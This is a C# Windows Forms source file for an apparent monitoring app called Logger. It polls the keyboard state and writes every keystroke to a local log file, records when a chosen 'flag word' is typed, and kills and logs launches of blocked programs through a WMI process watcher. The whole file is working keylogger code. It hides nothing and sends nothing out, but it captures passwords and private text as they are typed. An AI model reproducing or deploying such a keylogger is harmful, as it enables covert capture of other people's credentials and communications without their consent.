using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Management;
using System.Management.Instrumentation;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace Logger {
    public partial class LoggerMainMenu : Form {

        private static Options options;
        private Thread keyLoggerThread;
        private Thread checkBlockedAppThread;

        public LoggerMainMenu() {
            InitializeComponent();
            options = new Options();
        }
        private void optionsBtn_Click(object sender, EventArgs e) {
            if (keyLoggerThread != null) {
                keyLoggerThread.Abort();
                if (checkBlockedAppThread != null)
                    checkBlockedAppThread.Abort();
                startBtn.Enabled = true;
            }
            OptionsMenu optionsMenu = new OptionsMenu(ref options);
            optionsMenu.ShowDialog();
        }
        [DllImport("user32.dll")]
        public static extern int GetAsyncKeyState(Int32 i);
        private void startBtn_Click(object sender, EventArgs e) {
            startBtn.Enabled = false;

            if (options.isKeyLogger == true) {
                keyLoggerThread = new Thread(log);
                keyLoggerThread.IsBackground = true;
                keyLoggerThread.Start();
            }

            if (options.BlockedApplications != null) {
                if (options.BlockedApplications.Count > 0) {
                    checkBlockedAppThread = new Thread(checkBlockedApplication);
                    checkBlockedAppThread.IsBackground = true;
                    checkBlockedAppThread.Start();
                }
            }
        }
        private string BlockedWordBuff = string.Empty;
        private void log() {
            string symb;
            while (true) {
                Thread.Sleep(200);
                for (int i = 0; i < 255; i++) {
                    int state = GetAsyncKeyState(i);
                    bool isShift = false;
                    short shiftState = (short)GetAsyncKeyState(16);
                    if ((shiftState != 0) || Console.CapsLock) {
                        isShift = true;
                    }
                    if (state != 0) {
                        if (((Keys)i) == Keys.LButton || ((Keys)i) == Keys.RButton || ((Keys)i) == Keys.MButton) continue;
                        if (((Keys)i) == Keys.CapsLock || ((Keys)i) == Keys.Capital || ((Keys)i) == Keys.ShiftKey || ((Keys)i) == Keys.RShiftKey || ((Keys)i) == Keys.LShiftKey) continue;

                        switch ((Keys)i) {
                            case Keys.Space:
                                symb = " {" + ((Keys)i).ToString() + "} ";
                                break;
                            case Keys.Enter:
                                symb = "{" + ((Keys)i).ToString() + "}\n";
                                break;
                            default:
                                if (!isShift) {
                                    symb = ((Keys)i).ToString().ToLowerInvariant();
                                }
                                else
                                    symb = ((Keys)i).ToString();

                                if (symb[0] == 'd' && char.IsNumber(symb[1])) {
                                    symb = symb[1].ToString();
                                }
                                if (!string.IsNullOrWhiteSpace(options.FlagWord))
                                if (symb.Length == 1 && char.IsLetter(symb[0])) {
                                    BlockedWordBuff += symb;
                                    if (BlockedWordBuff.Length > options.FlagWord.Length) {
                                        StringBuilder sb = new StringBuilder(BlockedWordBuff, 1, options.FlagWord.Length, options.FlagWord.Length + 1);
                                        BlockedWordBuff = sb.ToString();
                                    }
                                }
                                   
                                break;
                        }

                        if (BlockedWordBuff == options.FlagWord) {
                            File.AppendAllText(options.SavePath + "blockedWord.log", $"[{DateTime.Now}]: The {options.FlagWord} was written!\n");
                            BlockedWordBuff = string.Empty;
                        }
                        
                        File.AppendAllText(options.SavePath + "keylogger.log", symb);
                    }
                }
            }
        }
        private void recorndBtn_Click(object sender, EventArgs e) {
            ReportForm rec = new ReportForm(options);
            rec.ShowDialog();


        }
        private void checkBlockedApplication() {
            ManagementEventWatcher startWatch = new ManagementEventWatcher(new WqlEventQuery("SELECT * FROM Win32_ProcessStartTrace"));
            startWatch.EventArrived += new EventArrivedEventHandler(startWatch_EventArrived);
            startWatch.Start();
        }
        static void startWatch_EventArrived(object sender, EventArrivedEventArgs e) {

            try {
                Process n = Process.GetProcessById(Convert.ToInt32(e.NewEvent.Properties["ProcessID"].Value));
                if (n.MainModule != null) {
                    foreach (var item in options.BlockedApplications) {
                        if (item.Path == n.MainModule.FileName) {
                            File.AppendAllText(options.SavePath + "BlockedPrograms.log", $"[{DateTime.Now}]: The program was launched: {n.ProcessName}\n");
                            n.Kill();
                            return;
                        }
                    }
                }
            }
            catch (Exception) {
                //ignoring
            }

        }

    }
}
